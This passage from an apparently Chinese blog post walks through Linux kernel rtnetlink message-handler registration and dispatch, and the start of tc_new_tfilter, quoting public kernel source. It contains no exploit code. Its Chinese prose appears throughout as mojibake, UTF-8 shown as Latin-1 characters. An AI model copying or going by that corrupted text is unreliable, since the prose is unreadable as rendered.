class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINK, rtnl_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETADDR, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETROUTE, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETNETCONF, <span class="literal">NULL</span>, rtnl_dump_all, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWLINKPROP, rtnl_newlinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELLINKPROP, rtnl_dellinkprop, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_NEWNEIGH, rtnl_fdb_add, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELNEIGH, rtnl_fdb_del, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETNEIGH, rtnl_fdb_get, rtnl_fdb_dump, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_GETLINK, <span class="literal">NULL</span>, rtnl_bridge_getlink, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_DELLINK, rtnl_bridge_dellink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_BRIDGE, RTM_SETLINK, rtnl_bridge_setlink, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETSTATS, rtnl_stats_get, rtnl_stats_dump,</span><br><span class="line">		      <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_SETSTATS, rtnl_stats_set, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦å°±æ˜¯è°ƒç”¨äº†<code>rtnl_register()</code>å‡½æ•°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtnl_register</span><span class="params">(<span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">		   rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = rtnl_register_internal(<span class="literal">NULL</span>, protocol, msgtype, doit, dumpit,</span><br><span class="line">				     flags);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		pr_err(<span class="string">&quot;Unable to register rtnetlink message handler, &quot;</span></span><br><span class="line">		       <span class="string">&quot;protocol = %d, message type = %d\n&quot;</span>, protocol, msgtype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>rtnl_register()</code>å‡½æ•°å£°æ˜å¯è§ä¸åŒæ¶ˆæ¯ç±»å‹çš„ä¸åŒtypeæœ‰ä¸¤ç§æ“ä½œï¼Œä¸€ç§æ˜¯<code>doit</code>,ä¸€ç§æ˜¯<code>dumpit</code>ã€‚æœ‰çš„ç±»å‹è¿™ä¸¤ç§æ“ä½œéƒ½æœ‰ï¼Œæœ‰çš„ç±»å‹åªæœ‰ä¸€ç§ã€‚</p>
<p>åœ¨<code>rtnl_register()</code>å‡½æ•°ä¸­åˆè°ƒç”¨äº†<code>rtnl_register_internal</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnl_register_internal</span><span class="params">(struct <span class="keyword">module</span> *owner,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">int</span> protocol, <span class="keyword">int</span> msgtype,</span></span></span><br><span class="line"><span class="params"><span class="function">				  rtnl_doit_func doit, rtnl_dumpit_func dumpit,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>, *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> __<span class="title">rcu</span> **<span class="title">tab</span>;</span></span><br><span class="line">	<span class="keyword">int</span> msgindex;</span><br><span class="line">	<span class="keyword">int</span> ret = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">	BUG_ON(protocol &lt; <span class="number">0</span> || protocol &gt; RTNL_FAMILY_MAX);</span><br><span class="line">	msgindex = rtm_msgindex(msgtype);</span><br><span class="line"></span><br><span class="line">	rtnl_lock();</span><br><span class="line">	tab = rtnl_dereference(rtnl_msg_handlers[protocol]);</span><br><span class="line">	<span class="keyword">if</span> (tab == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		tab = kcalloc(RTM_NR_MSGTYPES, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!tab)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* ensures we see the 0 stores */</span></span><br><span class="line">		rcu_assign_pointer(rtnl_msg_handlers[protocol], tab);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	old = rtnl_dereference(tab[msgindex]);</span><br><span class="line">	<span class="keyword">if</span> (old) &#123;</span><br><span class="line">		link = kmemdup(old, <span class="keyword">sizeof</span>(*old), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!link)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		link = kzalloc(<span class="keyword">sizeof</span>(*link), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!link)</span><br><span class="line">			<span class="keyword">goto</span> unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	WARN_ON(link-&gt;owner &amp;&amp; link-&gt;owner != owner);</span><br><span class="line">	link-&gt;owner = owner;</span><br><span class="line"></span><br><span class="line">	WARN_ON(doit &amp;&amp; link-&gt;doit &amp;&amp; link-&gt;doit != doit);</span><br><span class="line">	<span class="keyword">if</span> (doit)</span><br><span class="line">		link-&gt;doit = doit;</span><br><span class="line">	WARN_ON(dumpit &amp;&amp; link-&gt;dumpit &amp;&amp; link-&gt;dumpit != dumpit);</span><br><span class="line">	<span class="keyword">if</span> (dumpit)</span><br><span class="line">		link-&gt;dumpit = dumpit;</span><br><span class="line"></span><br><span class="line">	link-&gt;flags |= flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* publish protocol:msgtype */</span></span><br><span class="line">	rcu_assign_pointer(tab[msgindex], link);</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (old)</span><br><span class="line">		kfree_rcu(old, rcu);</span><br><span class="line">unlock:</span><br><span class="line">	rtnl_unlock();</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¶‰åŠåˆ°çš„ç»“æ„ä½“å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> &#123;</span></span><br><span class="line">	rtnl_doit_func		doit;</span><br><span class="line">	rtnl_dumpit_func	dumpit;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span>		*<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ªå…¨å±€æŒ‡é’ˆæ•°ç»„<code>static struct rtnl_link __rcu *__rcu *rtnl_msg_handlers[RTNL_FAMILY_MAX + 1];</code>ï¼Œä»–å…¶å®æ˜¯ä¸€ä¸ªäºŒé‡æŒ‡é’ˆï¼Œç¬¬ä¸€é‡æŒ‡é’ˆçš„ä¸‹æ ‡æ˜¯æ¶ˆæ¯ç±»å‹ï¼Œç¬¬äºŒé‡ä¸‹æ ‡æ˜¯æ¶ˆæ¯çš„type,æ‰€ä»¥æ¯ä¸€ä¸ªæ¶ˆæ¯ç±»å‹çš„æ¯ä¸€ä¸ªtypeéƒ½å¯¹åº”ä¸€ä¸ª<code>struct rtnl_link</code>ç»“æ„ä½“ã€‚</p>
<p>é™¤äº†<code>rtnetlink_init</code>ä¼šæ³¨å†Œæ¶ˆæ¯çš„æ“ä½œä¹‹å¤–ï¼Œ<code>tc_filter_init</code>ä¹Ÿä¼šæ³¨å†Œä¸€äº›æ¶ˆæ¯çš„æ“ä½œ,å…¶ä¸­<code>RTM_NEWTFILTER</code>è¿™ä¸ªç±»å‹å°±æ˜¯æ·»åŠ ä¸€ä¸ªæµé‡è¿‡æ»¤å™¨ï¼Œä»–åªæœ‰<code>doit</code>æ“ä½œï¼Œå‡½æ•°ä¸º<code>tc_new_tfilter()</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tc_filter_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tc_filter_wq = alloc_ordered_workqueue(<span class="string">&quot;tc_filter_workqueue&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!tc_filter_wq)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	err = register_pernet_subsys(&amp;tcf_net_ops);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> err_register_pernet_subsys;</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,</span><br><span class="line">		      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,</span><br><span class="line">		      tc_dump_chain, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_register_pernet_subsys:</span><br><span class="line">	destroy_workqueue(tc_filter_wq);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ç¨å¾®ç†æ¸…äº†æ¯ä¸ªæ¶ˆæ¯ç±»å‹çš„æ¯ä¸ªtypeå¦‚ä½•åœ¨å†…æ ¸ä¸­ç»„ç»‡å­˜å‚¨ï¼Œé‚£è¯¥å¦‚ä½•è°ƒç”¨è¿™äº›æ¶ˆæ¯çš„æ“ä½œå‡½æ•°å‘¢ï¼Œæ¯”å¦‚è¯´<code>RTM_NEWTFILTE</code>çš„<code>doit</code>.</p>
<p>å½“ç”¨æˆ·è¿›ç¨‹é€šè¿‡<code>NETLINK_ROUTE</code>åˆ›å»ºå¥—æ¥å­—å¹¶ä¸”å‘é€<code>RTM_NEWTFILTER</code>æ¶ˆæ¯ç”¨äºåˆ›å»ºä¸€ä¸ªæµé‡è¿‡æ»¤å™¨æ—¶,å†…æ ¸ä¼šè°ƒç”¨<code>rtnetlink_rcv_msg()</code>å‡½æ•°æ¥å¤„ç†rtnetlinkæ¶ˆæ¯ã€‚</p>
<p><code>struct nlmsghdr *nlh</code>è¿™ä¸ªç»“æ„ä½“åœ¨å­¦ä¹ netlinkçš„æ—¶å€™å°±å·²ç»è§è¿‡äº†,å…¶ä¸­<code>family</code>å°±æ˜¯æ¶ˆæ¯ç±»å‹ä¹Ÿå°±æ˜¯<code>protocol</code>,typeå°±æ˜¯<code>msgtype</code>ï¼Œç„¶åè°ƒç”¨<code>link = rtnl_get_link(family, type);</code>è·å¾—å¯¹åº”çš„<code>link</code>.è·å¾—äº†<code>link</code>åå°±è°ƒç”¨<code>link-&gt;doit()</code>å‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨åˆ°äº†<code>tc_new_tfilter()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnetlink_rcv_msg</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">			     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EOPNOTSUPP;</span><br><span class="line">	rtnl_doit_func doit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">int</span> kind;</span><br><span class="line">	<span class="keyword">int</span> family;</span><br><span class="line">	<span class="keyword">int</span> type;</span><br><span class="line"></span><br><span class="line">	type = nlh-&gt;nlmsg_type;</span><br><span class="line">	<span class="keyword">if</span> (type &gt; RTM_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	type -= RTM_BASE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* All the messages must have at least 1 byte length */</span></span><br><span class="line">	<span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct rtgenmsg))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	family = ((struct rtgenmsg *)nlmsg_data(nlh))-&gt;rtgen_family;</span><br><span class="line">	kind = type&amp;<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kind != <span class="number">2</span> &amp;&amp; !netlink_net_capable(skb, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	<span class="keyword">if</span> (kind == <span class="number">2</span> &amp;&amp; nlh-&gt;nlmsg_flags&amp;NLM_F_DUMP) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">rtnl</span>;</span></span><br><span class="line">		rtnl_dumpit_func dumpit;</span><br><span class="line">		u32 min_dump_alloc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		link = rtnl_get_link(family, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;dumpit) &#123;</span><br><span class="line">			family = PF_UNSPEC;</span><br><span class="line">			link = rtnl_get_link(family, type);</span><br><span class="line">			<span class="keyword">if</span> (!link || !link-&gt;dumpit)</span><br><span class="line">				<span class="keyword">goto</span> err_unlock;</span><br><span class="line">		&#125;</span><br><span class="line">		owner = link-&gt;owner;</span><br><span class="line">		dumpit = link-&gt;dumpit;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (type == RTM_GETLINK - RTM_BASE)</span><br><span class="line">			min_dump_alloc = rtnl_calcit(skb, nlh);</span><br><span class="line"></span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/* need to do this before rcu_read_unlock() */</span></span><br><span class="line">		<span class="keyword">if</span> (!try_module_get(owner))</span><br><span class="line">			err = -EPROTONOSUPPORT;</span><br><span class="line"></span><br><span class="line">		rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">		rtnl = net-&gt;rtnl;</span><br><span class="line">		<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> =</span> &#123;</span><br><span class="line">				.dump		= dumpit,</span><br><span class="line">				.min_dump_alloc	= min_dump_alloc,</span><br><span class="line">				.<span class="keyword">module</span>		= owner,</span><br><span class="line">			&#125;;</span><br><span class="line">			err = netlink_dump_start(rtnl, skb, nlh, &amp;c);</span><br><span class="line">			<span class="comment">/* netlink_dump_start() will keep a reference on</span></span><br><span class="line"><span class="comment">			 * module if dump is still in progress.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			module_put(owner);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (!link || !link-&gt;doit) &#123;</span><br><span class="line">		family = PF_UNSPEC;</span><br><span class="line">		link = rtnl_get_link(PF_UNSPEC, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;doit)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	owner = link-&gt;owner;</span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(owner)) &#123;</span><br><span class="line">		err = -EPROTONOSUPPORT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flags = link-&gt;flags;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; RTNL_FLAG_DOIT_UNLOCKED) &#123;</span><br><span class="line">		doit = link-&gt;doit;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		<span class="keyword">if</span> (doit)</span><br><span class="line">			err = doit(skb, nlh, extack);</span><br><span class="line">		module_put(owner);</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	rtnl_lock();</span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (link &amp;&amp; link-&gt;doit)</span><br><span class="line">		err = link-&gt;doit(skb, nlh, extack);</span><br><span class="line">	rtnl_unlock();</span><br><span class="line"></span><br><span class="line">	module_put(owner);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢ç»§ç»­åˆ†æ<code>tc_new_tfilter()</code>å‡½æ•°,è¿™ä¸ªå‡½æ•°ä»£ç è¾ƒå¤šå°±ä¸æ‘†å‡ºæ¥äº†ï¼Œä¸»è¦çœ‹ä¸€ä¸‹å…³é”®ä»£ç </p>
<p>åœ¨çœ‹å…³é”®ä»£ç ä¹‹å‰é¦–å…ˆè¦ææ¸…æ¥šä¸€ä¸ªæ•°æ®ç»“æ„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> &#123;</span></span><br><span class="line">	__u16           nla_len;</span><br><span class="line">	__u16           nla_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯<code>netlink</code>ä¸€èˆ¬çš„æ•°æ®æ®µæ ¼å¼ï¼Œå›¾ç¤ºå¦‚ä¸‹ã€‚</p>
<p><img src="https://e-mailky.github.io/images/kernel/23069658_1352297396Tqc4.jpg" alt="T5"></p>
<p>ä¸€ä¸ª<code>nlattr</code>+<code>value</code>å°±ç›¸å½“äºä¸€ä¸ªæ•°æ®æ®µçš„å­—æ®µäº†ã€‚å…¶ä¸­<code>length</code>æ˜¯nlattr+valueçš„æ€»é•¿åº¦ã€‚<code>tc_new_tfilter()</code>å‡½æ•°é¦–å…ˆåˆå§‹åŒ–äº†å˜é‡<code>struct nlattr *tca[TCA_MAX + 1]</code>,ä»–æ˜¯ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆæ•°ç»„ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªæŒ‡é’ˆéƒ½æŒ‡å‘äº†ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹ä¼ è¿›æ¥çš„å­—æ®µçš„é¦–åœ°å€ã€‚</p>
<p>è·å–æ¯ä¸€ä¸ªå­—æ®µä¹‹åï¼Œåé¢å°±æ˜¯å¯¹å­—æ®µçš„è§£æäº†ï¼Œé¦–å…ˆæ˜¯ä»å­—æ®µä¸­è·å–è¿‡æ»¤å™¨çš„åå­—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcf_proto_check_kind(tca[TCA_KIND], name)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified TC filter name too long&quot;</span>);</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ˜¯æ ¹æ®chainidx(å¯æ§)è·å–chain,ç„¶åæ ¹æ®chainè·å–ä¸€ä¸ªtp(struct tcf_proto),</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol,</span><br><span class="line">			       prio, prio_allocate);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter with specified priority/protocol not found&quot;</span>);</span><br><span class="line">		err = PTR_ERR(tp);</span><br><span class="line">		<span class="keyword">goto</span> errout_locked;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœtpä¸å­˜åœ¨è¿˜ä¼šæ ¹æ®è¿‡æ»¤å™¨åç§°<code>name</code>è°ƒç”¨<code>tcf_proto_create(</code>åˆ›å»ºä¸€ä¸ªæ–°çš„<code>tp</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tp_new = tcf_proto_create(name, protocol, prio, chain,</span><br><span class="line">					  rtnl_held, extack);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp_new)) &#123;</span><br><span class="line">			err = PTR_ERR(tp_new);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

